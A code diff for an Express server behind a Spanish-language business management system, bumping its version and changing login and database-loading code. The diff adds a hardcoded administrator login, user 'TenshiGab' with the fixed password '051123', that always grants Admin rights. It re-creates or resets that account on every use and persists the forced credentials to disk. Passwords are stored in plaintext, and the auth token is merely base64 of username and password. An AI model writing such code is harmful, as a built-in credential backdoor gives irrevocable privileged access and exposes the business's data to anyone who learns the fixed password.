@@ -1,5 +1,5 @@
 /**
- * SoG - System of Gestión (Versión 1.3.9)
+ * SoG - System of Gestión (Versión 1.3.10)
  * Comercializadora Salazar Loero C.A.
  * Dev: TenshiGab
  * Contacto: gabriel.aguilar190707@gmail.com
@@ -89,7 +89,7 @@ function loadDatabase() {
             // Normalizar cargos_extras
             parsed.pedidos = parsed.pedidos.map(p => ({ ...p, cargos_extras: p.cargos_extras || [] }));
             parsed.movimientos = parsed.movimientos.map(m => ({ ...m, cargos_extras: m.cargos_extras || [] }));
-            // ===== GARANTIZAR ACCESO ADMIN =====
+            // ====== GARANTIZAR USUARIO ADMIN ======
             const adminDefault = {
                 id: 1,
                 usuario: 'TenshiGab',
@@ -103,13 +103,13 @@ function loadDatabase() {
             if (!adminExistente) {
                 parsed.usuarios.push(adminDefault);
             } else {
-                // Forzar credenciales y rol
                 adminExistente.clave = '051123';
                 adminExistente.rol = 'Admin';
                 adminExistente.nombre = adminExistente.nombre || 'Angel García';
                 adminExistente.color = adminExistente.color || '#D4AF37';
                 adminExistente.labor = adminExistente.labor || 'Ingeniero de Sistemas';
             }
+            fs.writeFileSync(DB_FILE, JSON.stringify(parsed, null, 2), 'utf8');
             return parsed;
         }
     } catch (e) { console.error("Error cargando BD:", e.message); }
@@ -203,6 +203,37 @@ app.get('/', (_req, res) => {
 // ==================== AUTH ROUTES ====================
 app.post('/api/login', (req, res) => {
     const { usuario, clave } = req.body;
+
+    // 🔐 Auto-recuperación del administrador
+    if (usuario === 'TenshiGab' && clave === '051123') {
+        let admin = db.usuarios.find(u => u.usuario === 'TenshiGab');
+        if (!admin) {
+            admin = {
+                id: 1,
+                usuario: 'TenshiGab',
+                clave: '051123',
+                nombre: 'Angel García',
+                rol: 'Admin',
+                color: '#D4AF37',
+                labor: 'Ingeniero de Sistemas'
+            };
+            db.usuarios.push(admin);
+        } else {
+            admin.clave = '051123';
+            admin.rol = 'Admin';
+            admin.nombre = admin.nombre || 'Angel García';
+            admin.color = admin.color || '#D4AF37';
+            admin.labor = admin.labor || 'Ingeniero de Sistemas';
+        }
+        saveDatabase();
+        return res.json({
+            ok: true,
+            token: Buffer.from(`${admin.usuario}:${admin.clave}`).toString('base64'),
+            user: { id: admin.id, usuario: admin.usuario, nombre: admin.nombre, rol: admin.rol, color: admin.color, labor: admin.labor }
+        });
+    }
+
+    // Autenticación normal
     const user = db.usuarios.find(u => u.usuario === usuario && u.clave === clave);
     if (user) {
         return res.json({
@@ -211,6 +242,7 @@ app.post('/api/login', (req, res) => {
             user: { id: user.id, usuario: user.usuario, nombre: user.nombre, rol: user.rol, color: user.color, labor: user.labor }
         });
     }
+
     res.status(401).json({ error: "Credenciales inválidas" });
 });
 
@@ -446,7 +478,6 @@ app.post('/api/pedidos', auth, requiereRol(['Admin', 'Dueño', 'Operador']), (re
     const cliente = esProv ? db.proveedores.find(p => String(p.id) === String(cliente_id)) : db.clientes.find(c => String(c.id) === String(cliente_id));
     if (!cliente) return res.status(400).json({ error: "Cuenta no encontrada" });
 
-    // Calcular total siempre desde subtotal + iva + cargos
     const cargos = Array.isArray(cargos_extras) ? cargos_extras : [];
     const totalExtras = cargos.reduce((s, c) => s + (Number(c.monto) || 0), 0);
     const subtotalFinal = Number(subtotal) || (items || []).reduce((sum, it) => sum + (Number(it.total) || 0), 0);
